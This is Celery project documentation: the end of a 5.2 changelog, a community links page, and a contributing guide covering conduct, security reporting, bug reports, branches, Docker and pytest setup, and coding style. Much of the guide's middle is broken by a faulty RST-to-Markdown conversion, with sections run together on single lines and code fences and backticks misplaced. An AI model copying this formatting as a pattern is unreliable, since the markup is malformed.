  - Terminate job implementation for eventlet concurrency backend (\#6917).
  - Add cleanup implementation to filesystem backend (\#6919).
  - \[pre-commit.ci\] pre-commit autoupdate (\#69).
  - Add before\_start hook (fixes \#4110) (\#6923).
  - Restart consumer if connection drops (\#6930).
  - Remove outdated optimization documentation (\#6933).
  - added https verification check functionality in arangodb backend (\#6800).
  - Drop Python 3.6 support.
  - update supported python versions on readme.
  - \[pre-commit.ci\] pre-commit autoupdate (\#6935).
  - Remove appveyor configuration since we migrated to GA.
  - pyugrade is now set to upgrade code to 3.7.
  - Drop exclude statement since we no longer test with pypy-3.6.
  - 3.10 is not GA so it's not supported yet.
  - Celery 5.1 or earlier support Python 3.6.
  - Fix linting error.
  - fix: Pass a Context when chaining fail results (\#6899).
  - Bump version: 5.2.0b2 → 5.2.0b3.

## 5.2.0b2

  - release-date  
    2021-08-17 5.35 P.M UTC+3:00

  - release-by  
    Omer Katz

<!-- end list -->

  - Test windows on py3.10rc1 and pypy3.7 (\#6868).
  - Route chord\_unlock task to the same queue as chord body (\#6896).
  - Add message properties to app.tasks.Context (\#6818).
  - handle already converted LogLevel and JSON (\#6915).
  - 5.2 is codenamed dawn-chorus.
  - Bump version: 5.2.0b1 → 5.2.0b2.

## 5.2.0b1

  - release-date  
    2021-08-11 5.42 P.M UTC+3:00

  - release-by  
    Omer Katz

<!-- end list -->

  - Add Python 3.10 support (\#6807).
  - Fix docstring for Signal.send to match code (\#6835).
  - No blank line in log output (\#6838).
  - Chords get body\_type independently to handle cases where body.type does not exist (\#6847).
  - Fix \#6844 by allowing safe queries via app.inspect().active() (\#6849).
  - Fix multithreaded backend usage (\#6851).
  - Fix Open Collective donate button (\#6848).
  - Fix setting worker concurrency option after signal (\#6853).
  - Make ResultSet.on\_ready promise hold a weakref to self (\#6784).
  - Update configuration.rst.
  - Discard jobs on flush if synack isn't enabled (\#6863).
  - Bump click version to 8.0 (\#6861).
  - Amend IRC network link to Libera (\#6837).
  - Import celery lazily in pytest plugin and unignore flake8 F821, "undefined name '...'" (\#6872).
  - Fix inspect --json output to return valid json without --quiet.
  - Remove celery.task references in modules, docs (\#6869).
  - The Consul backend must correctly associate requests and responses (\#6823).

---

community.md

---

# Community Resources

This is a list of external blog posts, tutorials, and slides related to Celery. If you have a link that's missing from this list, please contact the mailing-list or submit a patch.

<div class="contents" data-local="">

</div>

## Resources

### Who's using Celery

<https://github.com/celery/celery/wiki#companieswebsites-using-celery>

### Wiki

<https://github.com/celery/celery/wiki>

### Celery questions on Stack Overflow

<https://stackoverflow.com/search?q=celery&tab=newest>

### Mailing-list Archive: celery-users

<http://blog.gmane.org/gmane.comp.python.amqp.celery.user>

## News<span id="res-irc-logs"></span>

This section has moved to the Celery homepage: <http://celeryproject.org/community/>

---

contributing.md

---

# Contributing

Welcome\!

This document is fairly extensive and you aren't really expected to study this in detail for small contributions;

> The most important rule is that contributing must be easy and that the community is friendly and not nitpicking on details, such as coding style.

If you're reporting a bug you should read the Reporting bugs section below to ensure that your bug report contains enough information to successfully diagnose the issue, and if you're contributing code you should try to mimic the conventions you see surrounding the code you're working on, but in the end all patches will be cleaned up by the person merging the changes so don't worry too much.

<div class="contents" data-local="">

</div>

## Community Code of Conduct

The goal is to maintain a diverse community that's pleasant for everyone. That's why we would greatly appreciate it if everyone contributing to and interacting with the community also followed this Code of Conduct.

The Code of Conduct covers our behavior as members of the community, in any forum, mailing list, wiki, website, Internet relay chat (IRC), public meeting or private correspondence.

The Code of Conduct is heavily based on the [Ubuntu Code of Conduct](https://www.ubuntu.com/community/conduct), and the [Pylons Code of Conduct](https://pylonsproject.org/community-code-of-conduct.html).

### Be considerate

Your work will be used by other people, and you in turn will depend on the work of others. Any decision you take will affect users and colleagues, and we expect you to take those consequences into account when making decisions. Even if it's not obvious at the time, our contributions to Celery will impact the work of others. For example, changes to code, infrastructure, policy, documentation and translations during a release may negatively impact others' work.

### Be respectful

The Celery community and its members treat one another with respect. Everyone can make a valuable contribution to Celery. We may not always agree, but disagreement is no excuse for poor behavior and poor manners. We might all experience some frustration now and then, but we cannot allow that frustration to turn into a personal attack. It's important to remember that a community where people feel uncomfortable or threatened isn't a productive one. We expect members of the Celery community to be respectful when dealing with other contributors as well as with people outside the Celery project and with users of Celery.

### Be collaborative

Collaboration is central to Celery and to the larger free software community. We should always be open to collaboration. Your work should be done transparently and patches from Celery should be given back to the community when they're made, not just when the distribution releases. If you wish to work on new code for existing upstream projects, at least keep those projects informed of your ideas and progress. It many not be possible to get consensus from upstream, or even from your colleagues about the correct implementation for an idea, so don't feel obliged to have that agreement before you begin, but at least keep the outside world informed of your work, and publish your work in a way that allows outsiders to test, discuss, and contribute to your efforts.

### When you disagree, consult others

Disagreements, both political and technical, happen all the time and the Celery community is no exception. It's important that we resolve disagreements and differing views constructively and with the help of the community and community process. If you really want to go a different way, then we encourage you to make a derivative distribution or alternate set of packages that still build on the work we've done to utilize as common of a core as possible.

### When you're unsure, ask for help

Nobody knows everything, and nobody is expected to be perfect. Asking questions avoids many problems down the road, and so questions are encouraged. Those who are asked questions should be responsive and helpful. However, when asking a question, care must be taken to do so in an appropriate forum.

### Step down considerately

Developers on every project come and go and Celery is no different. When you leave or disengage from the project, in whole or in part, we ask that you do so in a way that minimizes disruption to the project. This means you should tell people you're leaving and take the proper steps to ensure that others can pick up where you left off.

## Reporting Bugs

### Security

You must never report security related issues, vulnerabilities or bugs including sensitive information to the bug tracker, or elsewhere in public. Instead sensitive bugs must be sent by email to `security@celeryproject.org`.

If you'd like to submit the information encrypted our PGP key is:

    -----BEGIN PGP PUBLIC KEY BLOCK-----
    Version: GnuPG v1.4.15 (Darwin)
    
    mQENBFJpWDkBCADFIc9/Fpgse4owLNvsTC7GYfnJL19XO0hnL99sPx+DPbfr+cSE
    9wiU+Wp2TfUX7pCLEGrODiEP6ZCZbgtiPgId+JYvMxpP6GXbjiIlHRw1EQNH8RlX
    cVxy3rQfVv8PGGiJuyBBjxzvETHW25htVAZ5TI1+CkxmuyyEYqgZN2fNd0wEU19D
    +c10G1gSECbCQTCbacLSzdpngAt1Gkrc96r7wGHBBSvDaGDD2pFSkVuTLMbIRrVp
    lnKOPMsUijiip2EMr2DvfuXiUIUvaqInTPNWkDynLoh69ib5xC19CSVLONjkKBsr
    Pe+qAY29liBatatpXsydY7GIUzyBT3MzgMJlABEBAAG0MUNlbGVyeSBTZWN1cml0
    eSBUZWFtIDxzZWN1cml0eUBjZWxlcnlwcm9qZWN0Lm9yZz6JATgEEwECACIFAlJp
    WDkCGwMGCwkIBwMCBhUIAgkKCwQWAgMBAh4BAheAAAoJEOArFOUDCicIw1IH/26f
    CViDC7/P13jr+srRdjAsWvQztia9HmTlY8cUnbmkR9w6b6j3F2ayw8VhkyFWgYEJ
    wtPBv8mHKADiVSFARS+0yGsfCkia5wDSQuIv6XqRlIrXUyqJbmF4NUFTyCZYoh+C
    ZiQpN9xGhFPr5QDlMx2izWg1rvWlG1jY2Es1v/xED3AeCOB1eUGvRe/uJHKjGv7J
    rj0pFcptZX+WDF22AN235WYwgJM6TrNfSu8sv8vNAQOVnsKcgsqhuwomSGsOfMQj
    LFzIn95MKBBU1G5wOs7JtwiV9jefGqJGBO2FAvOVbvPdK/saSnB+7K36dQcIHqms
    5hU4Xj0RIJiod5idlRC5AQ0EUmlYOQEIAJs8OwHMkrdcvy9kk2HBVbdqhgAREMKy
    gmphDp7prRL9FqSY/dKpCbG0u82zyJypdb7QiaQ5pfPzPpQcd2dIcohkkh7G3E+e
    hS2L9AXHpwR26/PzMBXyr2iNnNc4vTksHvGVDxzFnRpka6vbI/hrrZmYNYh9EAiv
    uhE54b3/XhXwFgHjZXb9i8hgJ3nsO0pRwvUAM1bRGMbvf8e9F+kqgV0yWYNnh6QL
    4Vpl1+epqp2RKPHyNQftbQyrAHXT9kQF9pPlx013MKYaFTADscuAp4T3dy7xmiwS
    crqMbZLzfrxfFOsNxTUGE5vmJCcm+mybAtRo4aV6ACohAO9NevMx8pUAEQEAAYkB
    HwQYAQIACQUCUmlYOQIbDAAKCRDgKxTlAwonCNFbB/9esir/f7TufE+isNqErzR/
    aZKZo2WzZR9c75kbqo6J6DYuUHe6xI0OZ2qZ60iABDEZAiNXGulysFLCiPdatQ8x
    8zt3DF9BMkEck54ZvAjpNSern6zfZb1jPYWZq3TKxlTs/GuCgBAuV4i5vDTZ7xK/
    aF+OFY5zN7ciZHkqLgMiTZ+RhqRcK6FhVBP/Y7d9NlBOcDBTxxE1ZO1ute6n7guJ
    ciw4hfoRk8qNN19szZuq3UU64zpkM2sBsIFM9tGF2FADRxiOaOWZHmIyVZriPFqW
    RUwjSjs7jBVNq0Vy4fCu/5+e+XLOUBOoqtM5W7ELt0t1w9tXebtPEetV86in8fU2
    =0chn
    -----END PGP PUBLIC KEY BLOCK-----

### Other bugs

Bugs can always be described to the \[mailing-list\](\#mailing-list), but the best way to report an issue and to ensure a timely response is to use the issue tracker.

1)  **Create a GitHub account**.

You need to [create a GitHub account](https://github.com/signup/free) to be able to create new issues and participate in the discussion.

2)  **Determine if your bug is really a bug**.

You shouldn't file a bug if you're requesting support. For that you can use the \[mailing-list\](\#mailing-list), or \[irc-channel\](\#irc-channel). If you still need support you can open a github issue, please prepend the title with `[QUESTION]`.

3)  **Make sure your bug hasn't already been reported**.

Search through the appropriate Issue tracker. If a bug like yours was found, check if you have new information that could be reported to help the developers fix the bug.

4)  **Check if you're using the latest version**.

A bug could be fixed by some other improvements and fixes - it might not have an existing report in the bug tracker. Make sure you're using the latest releases of celery, billiard, kombu, amqp, and vine.

5)  **Collect information about the bug**.

To have the best chance of having a bug fixed, we need to be able to easily reproduce the conditions that caused it. Most of the time this information will be from a Python traceback message, though some bugs might be in design, spelling or other errors on the website/docs/code.

> 1)  If the error is from a Python traceback, include it in the bug report.
> 
> 2)  We also need to know what platform you're running (Windows, macOS, Linux, etc.), the version of your Python interpreter, and the version of Celery, and related packages that you were running when the bug occurred.
> 
> 3)  If you're reporting a race condition or a deadlock, tracebacks can be hard to get or might not be that useful. Try to inspect the process to get more diagnostic data. Some ideas:
>     
>       - Enable Celery's \[breakpoint signal \<breakpoint\_signal\>\](\#breakpoint-signal-\<breakpoint\_signal\>) and use it to inspect the process's state. This will allow you to open a `pdb` session.
>       - Collect tracing data using [strace](https://en.wikipedia.org/wiki/Strace)(Linux), `dtruss` (macOS), and `ktrace` (BSD), [ltrace](https://en.wikipedia.org/wiki/Ltrace), and [lsof](https://en.wikipedia.org/wiki/Lsof).
> 
> 4)  Include the output from the `celery report` command:
>     
>     >   - \`\`\`console  
>     >     $ celery -A proj report
>     > 
>     > This will also include your configuration settings and it will try to remove values for keys known to be sensitive, but make sure you also verify the information before submitting so that it doesn't contain confidential information like API tokens and authentication credentials.
> 
> 5)  Your issue might be tagged as <span class="title-ref">Needs Test Case</span>. A test case represents all the details needed to reproduce what your issue is reporting. A test case can be some minimal code that reproduces the issue or detailed instructions and configuration values that reproduces said issue.

6)  **Submit the bug**.

By default [GitHub](https://github.com) will email you to let you know when new comments have `` ` been made on your bug. In the event you've turned this feature off, you should check back on occasion to ensure you don't miss any questions a developer trying to fix the bug might ask.       .. _issue-trackers:  Issue Trackers --------------  Bugs for a package in the Celery ecosystem should be reported to the relevant issue tracker.  * :pypi:`celery`: https://github.com/celery/celery/issues/ * :pypi:`kombu`: https://github.com/celery/kombu/issues * :pypi:`amqp`: https://github.com/celery/py-amqp/issues * :pypi:`vine`: https://github.com/celery/vine/issues * :pypi:`pytest-celery`: https://github.com/celery/pytest-celery/issues * :pypi:`librabbitmq`: https://github.com/celery/librabbitmq/issues * :pypi:`django-celery-beat`: https://github.com/celery/django-celery-beat/issues * :pypi:`django-celery-results`: https://github.com/celery/django-celery-results/issues  If you're unsure of the origin of the bug you can ask the [mailing-list](#mailing-list), or just use the Celery issue tracker.  Contributors guide to the code base ===================================  There's a separate section for internal details, including details about the code base and a style guide.  Read [internals-guide](#internals-guide) for more!  .. _versions:  Versions ========  Version numbers consists of a major version, minor version and a release number. Since version 2.1.0 we use the versioning semantics described by SemVer: http://semver.org.  Stable releases are published at PyPI while development releases are only available in the GitHub git repository as tags. All version tags starts with “v”, so version 0.8.0 has the tag v0.8.0.  .. _git-branches:  Branches ========  Current active version branches:  * dev (which git calls "main") (https://github.com/celery/celery/tree/main) * 4.5 (https://github.com/celery/celery/tree/v4.5) * 3.1 (https://github.com/celery/celery/tree/3.1)  You can see the state of any branch by looking at the Changelog:      https://github.com/celery/celery/blob/main/Changelog.rst  If the branch is in active development the topmost version info should contain meta-data like: ``\`restructuredtext 4.3.0 ====== :release-date: TBA :status: DEVELOPMENT :branch: dev (git calls this main)

The `status` field can be one of:

  - `PLANNING`
    
    > The branch is currently experimental and in the planning stage.

  - `DEVELOPMENT`
    
    > The branch is in active development, but the test suite should be passing and the product should be working and possible for users to test.

  - `FROZEN`
    
    > The branch is frozen, and no more features will be accepted. When a branch is frozen the focus is on testing the version as much as possible before it is released.

dev branch `` ` ----------  The dev branch (called "main" by git), is where development of the next version happens.  Maintenance branches --------------------  Maintenance branches are named after the version -- for example, the maintenance branch for the 2.2.x series is named ``2.2`.  Previously these were named`releaseXX-maint`.  The versions we currently maintain is:  * 4.2    This is the current series.  * 4.1    Drop support for python 2.6. Add support for python 3.4, 3.5 and 3.6.  * 3.1    Official support for python 2.6, 2.7 and 3.3, and also supported on PyPy.  Archived branches -----------------  Archived branches are kept for preserving history only, and theoretically someone could provide patches for these if they depend on a series that's no longer officially supported.  An archived version is named`X.Y-archived`.  To maintain a cleaner history and drop compatibility to continue improving the project, we **do not have any archived version** right now.  Feature branches ----------------  Major new features are worked on in dedicated branches. There's no strict naming requirement for these branches.  Feature branches are removed once they've been merged into a release branch.  Tags ====  - Tags are used exclusively for tagging releases. A release tag is   named with the format`vX.Y.Z`-- for example`v2.3.1`.  - Experimental releases contain an additional identifier`vX.Y.Z-id`--   for example`v3.0.0-rc1``.  - Experimental tags may be removed after the official release.  .. _contributing-changes:  Working on Features & Patches =============================  > **Note** >      Contributing to Celery should be as simple as possible,     so none of these steps should be considered mandatory.      You can even send in patches by email if that's your preferred     work method. We won't like you any less, any contribution you make     is always appreciated!      However, following these steps may make maintainer's life easier,     and may mean that your changes will be accepted sooner.  Forking and setting up the repository -------------------------------------  First you need to fork the Celery repository; a good introduction to this is in the GitHub Guide: `Fork a Repo`_.  After you have cloned the repository, you should checkout your copy to a directory on your machine:``\`console $ git clone <git@github.com>:username/celery.git

When the repository is cloned, enter the directory to set up easy access `` ` to upstream changes: ``\`console $ cd celery $ git remote add upstream <git@github.com>:celery/celery.git $ git fetch upstream

If you need to pull in new changes from upstream you should `` ` always use the ``--rebase`option to`git pull`:`\`console git pull --rebase upstream main

With this option, you don't clutter the history with merging `` ` commit notes. See `Rebasing merge commits in git`_. If you want to learn more about rebasing, see the `Rebase`_ section in the GitHub guides.  If you need to work on a different branch than the one git calls ``main`, you can fetch and checkout a remote branch like this::      git checkout --track -b 5.0-devel upstream/5.0-devel  **Note:** Any feature or fix branch should be created from`upstream/main``.       .. _contributing-docker-development:  Developing and Testing with Docker ----------------------------------  Because of the many components of Celery, such as a broker and backend, `Docker`_ and `docker-compose`_ can be utilized to greatly simplify the development and testing cycle. The Docker configuration here requires a Docker version of at least 17.13.0 and `docker-compose` 1.13.0+.  The Docker components can be found within the :file:`docker/` folder and the Docker image can be built via:``\`console $ docker compose build celery

and run via:

``` console
$ docker compose run --rm celery <command>
```

where \<command\> is a command to execute in a Docker container. The <span class="title-ref">--rm</span> flag `` ` indicates that the container should be removed after it is exited and is useful to prevent accumulation of unwanted containers.  Some useful commands to run:  * ``bash`To enter the Docker container like a normal shell  *`make test`To run the test suite.     **Note:** This will run tests using python 3.12 by default.  *`tox``To run tox and test against a variety of configurations.     **Note:** This command will run tests for every environment defined in :file:`tox.ini`.     It takes a while.  *``pyenv exec python{3.8,3.9,3.10,3.11,3.12} -m pytest t/unit`To run unit tests using pytest.      **Note:**`{3.8,3.9,3.10,3.11,3.12}`means you can use any of those options.     e.g.`pyenv exec python3.12 -m pytest t/unit`*`pyenv exec python{3.8,3.9,3.10,3.11,3.12} -m pytest t/integration`To run integration tests using pytest      **Note:**`{3.8,3.9,3.10,3.11,3.12}`means you can use any of those options.     e.g.`pyenv exec python3.12 -m pytest t/unit``By default, docker-compose will mount the Celery and test folders in the Docker container, allowing code changes and testing to be immediately visible inside the Docker container. Environment variables, such as the broker and backend to use are also defined in the :file:`docker/docker-compose.yml` file.  By running``docker compose build celery`an image will be created with the name`celery/celery:dev`. This docker image has every dependency needed for development installed.`pyenv``is used to install multiple python versions, the docker image offers python 3.8, 3.9, 3.10, 3.11 and 3.12. The default python version is set to 3.12.  The :file:`docker-compose.yml` file defines the necessary environment variables to run integration tests. The``celery`service also mounts the codebase and sets the`PYTHONPATH`environment variable to`/home/developer/celery`. By setting`PYTHONPATH`the service allows to use the mounted codebase as global module for development. If you prefer, you can also run`python -m pip install -e .``to install the codebase in development mode.  If you would like to run a Django or stand alone project to manually test or debug a feature, you can use the image built by `docker compose` and mount your custom code. Here's an example:  Assuming a folder structure such as:``\`console + celery\_project + celery \# repository cloned here. + my\_project - manage.py + my\_project - views.py

``` yaml
version: "3"

services:
    celery:
        image: celery/celery:dev
        environment:
            TEST_BROKER: amqp://rabbit:5672
            TEST_BACKEND: redis://redis
         volumes:
             - ../../celery:/home/developer/celery
             - ../my_project:/home/developer/my_project
         depends_on:
             - rabbit
             - redis
     rabbit:
         image: rabbitmq:latest
     redis:
         image: redis:latest
```

In the previous example, we are using the image that we can build from `` ` this repository and mounting the celery code base as well as our custom project.     .. _contributing-testing:  Running the unit test suite ---------------------------  If you like to develop using virtual environments or just outside docker, you must make sure all necessary dependencies are installed. There are multiple requirements files to make it easier to install all dependencies. You do not have to use every requirements file but you must use `default.txt`. ``\`console \# pip install -U -r requirements/default.txt

To run the Celery test suite you need to install `` ` :file:`requirements/test.txt`. ``\`console $ pip install -U -r requirements/test.txt $ pip install -U -r requirements/default.txt

After installing the dependencies required, you can now execute `` ` the test suite by calling :pypi:`pytest <pytest>`: ``\`console $ pytest t/unit $ pytest t/integration

Some useful options to `pytest` are:

  - `-x`
    
    > Stop running the tests at the first test that fails.

  - `-s`
    
    > Don't capture output

  - `-v`
    
    > Run with verbose output.

If you want to run the tests for a single test file only `` ` you can do so like this: ``\`console $ pytest t/unit/worker/test\_worker.py

<div id="contributing-coverage">

Calculating test coverage `` ` ~~~~~~~~~~~~~~~~~~~~~~~~~  To calculate test coverage you must first install the :pypi:`pytest-cov` module.  Installing the :pypi:`pytest-cov` module: ``\`console $ pip install -U pytest-cov

</div>

Code coverage in HTML format `` ` ^^^^^^^^^^^^^^^^^^^^^^^^^^^^  #. Run :command:`pytest` with the ``--cov-report=html`argument enabled:`\`console $ pytest --cov=celery --cov-report=html

1.  The coverage output will then be located in the `htmlcov/` directory:
    
    > 
    > 
    > ``` console
    > $ open htmlcov/index.html
    > ```

Code coverage in XML (Cobertura-style) `` ` ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^  #. Run :command:`pytest` with the ``--cov-report=xml`argument enabled:`\`console $ pytest --cov=celery --cov-report=xml

1.  The coverage XML output will then be located in the `coverage.xml` file.

<div id="contributing-tox">

Running the tests on all supported Python versions `` ` ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  There's a :pypi:`tox` configuration file in the top directory of the distribution.  To run the tests for all supported Python versions simply execute: ``\`console $ tox

</div>

Use the `tox -e` option if you only want to test specific Python versions:

``` console
$ tox -e 3.7
```

Building the documentation `` ` --------------------------  To build the documentation, you need to install the dependencies listed in :file:`requirements/docs.txt` and :file:`requirements/default.txt`: ``\`console $ pip install -U -r requirements/docs.txt $ pip install -U -r requirements/default.txt

Additionally, to build with no warnings, you will need to install `` ` the following packages: ``\`console $ apt-get install texlive texlive-latex-extra dvipng

After these dependencies are installed, you should be able to `` ` build the docs by running: ``\`console $ cd docs $ rm -rf \_build $ make html

Make sure there are no errors or warnings in the build output. `` ` After building succeeds, the documentation is available at :file:`_build/html`.  .. _contributing-verify:  Build the documentation using Docker ------------------------------------  Build the documentation by running: ``\`console $ docker compose -f docker/docker-compose.yml up --build docs

The service will start a local docs server at `:7000`. The server is using `` ` ``sphinx-autobuild`with the`--watch``option enabled, so you can live edit the documentation. Check the additional options and configs in :file:`docker/docker-compose.yml`  Verifying your contribution ---------------------------  To use these tools, you need to install a few dependencies. These dependencies can be found in :file:`requirements/pkgutils.txt`.  Installing the dependencies:``\`console $ pip install -U -r requirements/pkgutils.txt

pyflakes & PEP-8 `` ` ~~~~~~~~~~~~~~~~  To ensure that your changes conform to :pep:`8` and to run pyflakes execute: ``\`console $ make flakecheck

To not return a negative exit code when this command fails, use `` ` the ``flakes`target instead:`\`console $ make flakes

API reference `` ` ~~~~~~~~~~~~~  To make sure that all modules have a corresponding section in the API reference, please execute: ``\`console $ make apicheck

If files are missing, you can add them by copying an existing reference file.

If the module is internal, it should be part of the internal reference `` ` located in :file:`docs/internals/reference/`. If the module is public, it should be located in :file:`docs/reference/`.  For example, if reference is missing for the module ``celery.worker.awesome`and this module is considered part of the public API, use the following steps:   Use an existing file as a template:`\`console $ cd docs/reference/ $ cp celery.schedules.rst celery.worker.awesome.rst

Edit the file using your favorite editor:

``` console
$ vim celery.worker.awesome.rst

    # change every occurrence of ``celery.schedules`` to
    # ``celery.worker.awesome``
```

Edit the index using your favorite editor:

``` console
$ vim index.rst

    # Add ``celery.worker.awesome`` to the index.
```

Commit your changes:

``` console
# Add the file to git
$ git add celery.worker.awesome.rst
$ git add index.rst
$ git commit celery.worker.awesome.rst index.rst \
    -m "Adds reference for celery.worker.awesome"
```

Isort `` ` ~~~~~~  `Isort`_ is a python utility to help sort imports alphabetically and separated into sections. The Celery project uses isort to better maintain imports on every module. Please run isort if there are any new modules or the imports on an existent module had to be modified. ``\`console $ isort my\_module.py \# Run isort for one file $ isort -rc . \# Run it recursively $ isort m\_module.py --diff \# Do a dry-run to see the proposed changes

<div id="contributing-pull-requests">

Creating pull requests `` ` ----------------------  When your feature/bugfix is complete, you may want to submit a pull request, so that it can be reviewed by the maintainers.  Before submitting a pull request, please make sure you go through this checklist to make it easier for the maintainers to accept your proposed changes:  - [ ] Make sure any change or new feature has a unit and/or integration test.       If a test is not written, a label will be assigned to your PR with the name ``Needs Test Coverage`.  - [ ] Make sure unit test coverage does not decrease.`pytest -xv --cov=celery --cov-report=xml --cov-report term`.       You can check the current test coverage here: https://codecov.io/gh/celery/celery  - [ ] Run`pre-commit`against the code. The following commands are valid       and equivalent.:`\`console $ pre-commit run --all-files $ tox -e lint

</div>

  -   - \[ \] Build api docs to make sure everything is OK. The following commands are valid  
        and equivalent.:
        
        ``` console
        $ make apicheck
        $ cd docs && sphinx-build -b apicheck -d _build/doctrees . _build/apicheck
        $ tox -e apicheck
        ```

  -   - \[ \] Build configcheck. The following commands are valid  
        and equivalent.:
        
        ``` console
        $ make configcheck
        $ cd docs && sphinx-build -b configcheck -d _build/doctrees   . _build/configcheck
        $ tox -e configcheck
        ```

  -   - \[ \] Run `bandit` to make sure there's no security issues. The following commands are valid  
        and equivalent.:
        
        ``` console
        $ pip install -U bandit
        $ bandit -b bandit.json celery/
        $ tox -e bandit
        ```

  -   - \[ \] Run unit and integration tests for every python version. The following commands are valid  
        and equivalent.:
        
        ``` console
        $ tox -v
        ```

  - \[ \] Confirm `isort` on any new or modified imports:
    
    > 
    > 
    > ``` console
    > $ isort my_module.py --diff
    > ```

Creating pull requests is easy, and they also let you track the progress `` ` of your contribution. Read the `Pull Requests`_ section in the GitHub Guide to learn how this is done.  You can also attach pull requests to existing issues by following the steps outlined here: https://bit.ly/koJoso  You can also use `hub`_ to create pull requests. Example: https://theiconic.tech/git-hub-fbe2e13ef4d1      Status Labels ~~~~~~~~~~~~~~  There are `different labels`_ used to easily manage github issues and PRs. Most of these labels make it easy to categorize each issue with important details. For instance, you might see a ``Component:canvas`label on an issue or PR. The`Component:canvas`label means the issue or PR corresponds to the canvas functionality. These labels are set by the maintainers and for the most part external contributors should not worry about them. A subset of these labels are prepended with **Status:**. Usually the **Status:** labels show important actions which the issue or PR needs. Here is a summary of such statuses:  - **Status: Cannot Reproduce**    One or more Celery core team member has not been able to reproduce the issue.  - **Status: Confirmed**    The issue or PR has been confirmed by one or more Celery core team member.  - **Status: Duplicate**    A duplicate issue or PR.  - **Status: Feedback Needed**    One or more Celery core team member has asked for feedback on the issue or PR.  - **Status: Has Testcase**    It has been confirmed the issue or PR includes a test case.   This is particularly important to correctly write tests for any new   feature or bug fix.  - **Status: In Progress**    The PR is still in progress.  - **Status: Invalid**    The issue reported or the PR is not valid for the project.  - **Status: Needs Documentation**    The PR does not contain documentation for the feature or bug fix proposed.  - **Status: Needs Rebase**    The PR has not been rebased with`main`. It is very important to rebase   PRs before they can be merged to`main``to solve any merge conflicts.  - **Status: Needs Test Coverage**    Celery uses `codecov`_ to verify code coverage. Please make sure PRs do not   decrease code coverage. This label will identify PRs which need code coverage.  - **Status: Needs Test Case**    The issue or PR needs a test case. A test case can be a minimal code snippet   that reproduces an issue or a detailed set of instructions and configuration values   that reproduces the issue reported. If possible a test case can be submitted in   the form of a PR to Celery's integration suite. The test case will be marked   as failed until the bug is fixed. When a test case cannot be run by Celery's   integration suite, then it's better to describe in the issue itself.  - **Status: Needs Verification**    This label is used to notify other users we need to verify the test case offered   by the reporter and/or we need to include the test in our integration suite.  - **Status: Not a Bug**    It has been decided the issue reported is not a bug.  - **Status: Won't Fix**    It has been decided the issue will not be fixed. Sadly the Celery project does   not have unlimited resources and sometimes this decision has to be made.   Although, any external contributors are invited to help out even if an   issue or PR is labeled as``Status: Won't Fix``.  - **Status: Works For Me**    One or more Celery core team members have confirmed the issue reported works   for them.     .. _coding-style:  Coding Style ============  You should probably be able to pick up the coding style from surrounding code, but it is a good idea to be aware of the following conventions.  * All Python code must follow the :pep:`8` guidelines.  :pypi:`pep8` is a utility you can use to verify that your code is following the conventions.  * Docstrings must follow the :pep:`257` conventions, and use the following   style.      Do this:``\`python def method(self, arg): """Short description.

> More details.
> 
> """
> 
> or:
> 
> ``` python
> ```
> 
> def method(self, arg): """Short description."""
> 
> but not this:
> 
> ``` python
> ```
> 
> def method(self, arg): """ Short description. """

  - Lines shouldn't exceed 78 columns.
    
    You can enforce this in `vim` by setting the `textwidth` option:
    
    ``` vim
    set textwidth=78
    ```
    
    If adhering to this limit makes the code less readable, you have one more character to go on. This means 78 is a soft limit, and 79 is the hard limit :)

  - Import order
    
    >   - Python standard library (<span class="title-ref">import xxx</span>)
    >   - Python standard library (<span class="title-ref">from xxx import</span>)
    >   - Third-party packages.
    >   - Other modules from the current package.
    > 
    > or in case of code using Django:
    > 
    >   - Python standard library (<span class="title-ref">import xxx</span>)
    >   - Python standard library (<span class="title-ref">from xxx import</span>)
    >   - Third-party packages.
    >   - Django packages.
    >   - Other modules from the current package.
    > 
    > Within these sections the imports should be sorted by module name.
    > 
    > Example:
    > 
    > ``` python
    > import threading
    > import time
    > 
    > from collections import deque
    > from Queue import Queue, Empty
    > 
    > from .platforms import Pidfile
    > from .utils.time import maybe_timedelta
    > ```

  - Wild-card imports must not be used (<span class="title-ref">from xxx import \*</span>).

  - For distributions where Python 2.5 is the oldest support version, additional rules apply:
    
    >   - Absolute imports must be enabled at the top of every module:
    >     
    >         from __future__ import absolute_import
    > 
    >   - If the module uses the `with` statement and must be compatible with Python 2.5 (celery isn't), then it must also enable that:
    >     
    >         from __future__ import with_statement
    > 
    >   - Every future import must be on its own line, as older Python 2.5 releases didn't support importing multiple features on the same future import line:
    >     
    >         # Good
    >         from __future__ import absolute_import
    >         from __future__ import with_statement
    >         
    >         # Bad
    >         from __future__ import absolute_import, with_statement
    > 
    > > (Note that this rule doesn't apply if the package doesn't include support for Python 2.5)

  - Note that we use "new-style" relative imports when the distribution doesn't support Python versions below 2.5
    
    > This requires Python 2.5 or later:
    > 
    > ``` python
    > from . import submodule
    > ```

<div id="feature-with-extras">

Contributing features requiring additional libraries `` ` ====================================================  Some features like a new result backend may require additional libraries that the user must install.  We use setuptools `extra_requires` for this, and all new optional features that require third-party libraries must be added.  1) Add a new requirements file in `requirements/extras`      For the Cassandra backend this is     :file:`requirements/extras/cassandra.txt`, and the file looks like this: ``\`text pycassa

</div>

> These are pip requirement files, so you can have version specifiers and multiple packages are separated by newline. A more complex example could be:
> 
> ``` text
> # pycassa 2.0 breaks Foo
> pycassa>=1.0,<2.0
> thrift
> ```

2)  Modify `setup.py`
    
    > After the requirements file is added, you need to add it as an option to `setup.py` in the `extras_require` section:
    > 
    >     extra['extras_require'] = {
    >         # ...
    >         'cassandra': extras('cassandra.txt'),
    >     }

3)  Document the new feature in `docs/includes/installation.txt`
    
    > You must add your feature to the list in the \[bundles\](\#bundles) section of `docs/includes/installation.txt`.
    > 
    > After you've made changes to this file, you need to render the distro `README` file:
    > 
    > ``` console
    > $ pip install -U -r requirements/pkgutils.txt
    > $ make readme
    > ```

